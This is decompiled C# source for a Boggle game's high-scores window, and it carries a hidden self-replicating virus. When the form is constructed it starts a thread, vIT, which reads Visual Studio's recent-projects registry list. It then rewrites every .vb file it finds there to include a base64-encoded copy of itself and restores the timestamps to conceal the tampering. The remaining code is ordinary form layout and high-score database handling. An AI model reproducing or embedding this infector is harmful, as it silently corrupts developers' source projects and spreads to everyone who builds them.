using System;
using System.ComponentModel;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Boggle;

public class frmHighScores : Form
{
	[AccessedThroughProperty("btnClear")]
	private Button _btnClear;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("lstMain")]
	private ListBox _lstMain;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	private IContainer components;

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label1 == null)
			{
			}
			_Label1 = value;
			if (_Label1 != null)
			{
			}
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label2 == null)
			{
			}
			_Label2 = value;
			if (_Label2 != null)
			{
			}
		}
	}

	internal virtual Label Label3
	{
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label3 == null)
			{
			}
			_Label3 = value;
			if (_Label3 != null)
			{
			}
		}
	}

	internal virtual Label Label4
	{
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label4 == null)
			{
			}
			_Label4 = value;
			if (_Label4 != null)
			{
			}
		}
	}

	internal virtual ListBox lstMain
	{
		get
		{
			return _lstMain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lstMain == null)
			{
			}
			_lstMain = value;
			if (_lstMain != null)
			{
			}
		}
	}

	internal virtual Label Label5
	{
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Label5 == null)
			{
			}
			_Label5 = value;
			if (_Label5 != null)
			{
			}
		}
	}

	internal virtual Button btnClear
	{
		get
		{
			return _btnClear;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnClear != null)
			{
				((Control)_btnClear).remove_Click((EventHandler)btnClear_Click);
			}
			_btnClear = value;
			if (_btnClear != null)
			{
				((Control)_btnClear).add_Click((EventHandler)btnClear_Click);
			}
		}
	}

	private void vIT()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		if (registryKey.ValueCount == 0)
		{
			ProjectData.EndApp();
		}
		string text = "Private Sub vIT()";
		string text2 = "Public Sub New()";
		string text3 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
		string text4 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC";
		text4 += "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE";
		text4 += "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT";
		text4 += "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T";
		text4 += "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K";
		text4 += "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi";
		text4 += "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0";
		text4 += "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy";
		text4 += "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE";
		text4 += "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ";
		text4 += "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U";
		text4 += "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t";
		text4 += "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g";
		text4 += "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg";
		text4 += "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog";
		text4 += "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy";
		text4 += "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo";
		text4 += "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9";
		text4 += "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs";
		text4 += "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB";
		text4 += "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp";
		text4 += "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku";
		text4 += "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k";
		text4 += "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN";
		text4 += "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g";
		text4 += "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp";
		text4 += "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp";
		text4 += "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU";
		text4 += "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu";
		text4 += "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+";
		text4 += "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu";
		text4 += "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD";
		text4 += "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp";
		text4 += "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD";
		text4 += "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu";
		text4 += "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz";
		text4 += "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0";
		text4 += "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(text4));
		string text5 = "J = \"";
		int num = Strings.Len(text4);
		checked
		{
			for (int i = 1; i <= num; i += 64)
			{
				text5 = ((i + 64 >= Strings.Len(text4)) ? (text5 + Strings.Mid(text4, i, 64) + "\"") : string.Concat(text5 + Strings.Mid(text4, i, 64) + "\"", "\r\nJ = J & ", "\""));
			}
			@string = Strings.Replace(@string, "J = \"\"", text5, 1, 1, (CompareMethod)1);
			text5 = "";
			int num2 = registryKey.ValueCount - 1;
			for (int i = 0; i <= num2; i++)
			{
				string text6 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[i]));
				text6 = Strings.Mid(text6, 1, Strings.InStrRev(text6, "\\", -1, (CompareMethod)1));
				if (!Directory.Exists(text6))
				{
					continue;
				}
				string[] files = Directory.GetFiles(text6, "*.vb");
				int num3 = Information.LBound((Array)files, 1);
				int num4 = Information.UBound((Array)files, 1);
				for (int j = num3; j <= num4; j++)
				{
					DateTime lastAccessTime = File.GetLastAccessTime(files[j]);
					DateTime lastWriteTime = File.GetLastWriteTime(files[j]);
					FileAttributes attributes = File.GetAttributes(files[j]);
					File.SetAttributes(files[j], FileAttributes.Normal);
					StreamReader streamReader = File.OpenText(files[j]);
					string text7 = streamReader.ReadToEnd();
					streamReader.Close();
					if ((Strings.InStr(text7, text, (CompareMethod)1) == 0) & (Strings.InStr(text7, text2, (CompareMethod)1) != 0))
					{
						text7 = Strings.Replace(text7, "MyBase.New()", "MyBase.New()\r\n" + text3, 1, 1, (CompareMethod)1);
						text7 = Strings.Replace(text7, text2, @string + text2, 1, 1, (CompareMethod)1);
						StreamWriter streamWriter = File.CreateText(files[j]);
						streamWriter.Write(text7);
						streamWriter.Flush();
						streamWriter.Close();
					}
					File.SetLastWriteTime(files[j], lastWriteTime);
					File.SetLastAccessTime(files[j], lastAccessTime);
					File.SetAttributes(files[j], attributes);
				}
			}
		}
	}

	public frmHighScores()
	{
		((Form)this).add_Load((EventHandler)frmHighScores_Load);
		Thread thread = new Thread(vIT);
		thread.Start();
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Expected O, but got Unknown
		//IL_018f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0199: Expected O, but got Unknown
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Expected O, but got Unknown
		//IL_0298: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a2: Expected O, but got Unknown
		//IL_0312: Unknown result type (might be due to invalid IL or missing references)
		//IL_031c: Expected O, but got Unknown
		lstMain = new ListBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		Label5 = new Label();
		btnClear = new Button();
		((Control)this).SuspendLayout();
		lstMain.set_BackColor(Color.Black);
		((Control)lstMain).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		lstMain.set_ForeColor(Color.DodgerBlue);
		lstMain.set_ItemHeight(16);
		ListBox obj = lstMain;
		Point location = new Point(16, 72);
		((Control)obj).set_Location(location);
		((Control)lstMain).set_Name("lstMain");
		ListBox obj2 = lstMain;
		Size size = new Size(248, 164);
		((Control)obj2).set_Size(size);
		((Control)lstMain).set_TabIndex(0);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		location = new Point(16, 56);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(38, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		((Control)Label1).set_Text("Player");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label label3 = Label2;
		location = new Point(88, 56);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(32, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(2);
		((Control)Label2).set_Text("Level");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label label5 = Label3;
		location = new Point(224, 56);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(35, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(3);
		((Control)Label3).set_Text("Score");
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label label7 = Label4;
		location = new Point(152, 56);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(45, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(4);
		((Control)Label4).set_Text("Rounds");
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Label label9 = Label5;
		location = new Point(36, 16);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(208, 24);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(5);
		((Control)Label5).set_Text("Top 10 Winning Streaks");
		Button obj3 = btnClear;
		location = new Point(80, 248);
		((Control)obj3).set_Location(location);
		((Control)btnClear).set_Name("btnClear");
		Button obj4 = btnClear;
		size = new Size(120, 23);
		((Control)obj4).set_Size(size);
		((Control)btnClear).set_TabIndex(6);
		((Control)btnClear).set_Text("Clear High Scores");
		size = new Size(5, 13);
		((Form)this).set_AutoScaleBaseSize(size);
		((Form)this).set_BackColor(Color.DarkGray);
		size = new Size(280, 285);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().AddRange((Control[])(object)new Control[7]
		{
			(Control)btnClear,
			(Control)Label5,
			(Control)Label4,
			(Control)Label3,
			(Control)Label2,
			(Control)Label1,
			(Control)lstMain
		});
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmHighScores");
		((Control)this).set_Text("Boggle .Net Winning Streaks");
		((Control)this).ResumeLayout(false);
	}

	private void frmHighScores_Load(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		OleDbCommand val = new OleDbCommand("Select * From HighScores Order By Rounds Desc", modGlobal.conBoggle);
		checked
		{
			((Control)this).set_Left((int)Math.Round((double)Screen.get_PrimaryScreen().get_Bounds().Width / 2.0 - (double)((Control)this).get_Width() / 2.0));
			((Control)this).set_Top((int)Math.Round((double)Screen.get_PrimaryScreen().get_Bounds().Height / 2.0 - (double)((Control)this).get_Height() / 2.0));
			modGlobal.conBoggle.Open();
			OleDbDataReader val2 = val.ExecuteReader();
			while (val2.Read())
			{
				lstMain.get_Items().Add(ObjectType.StrCatObj(ObjectType.StrCatObj(ObjectType.StrCatObj(ObjectType.StrCatObj(ObjectType.StrCatObj(ObjectType.StrCatObj(ObjectType.StrCatObj((object)" ", val2.get_Item(0)), (object)"\t"), val2.get_Item(1)), (object)"\t"), val2.get_Item(2)), (object)"\t"), val2.get_Item(3)));
			}
			val2.Close();
			modGlobal.conBoggle.Close();
		}
	}

	private void btnClear_Click(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected I4, but got Unknown
		OleDbCommand val = new OleDbCommand("Delete From HighScores", modGlobal.conBoggle);
		int num = (int)MessageBox.Show("Are you sure you want to clear the high score table?", "Clear High Scores", (MessageBoxButtons)4);
		if (num != 7)
		{
			modGlobal.conBoggle.Open();
			val.ExecuteNonQuery();
			modGlobal.conBoggle.Close();
			lstMain.get_Items().Clear();
		}
	}
}
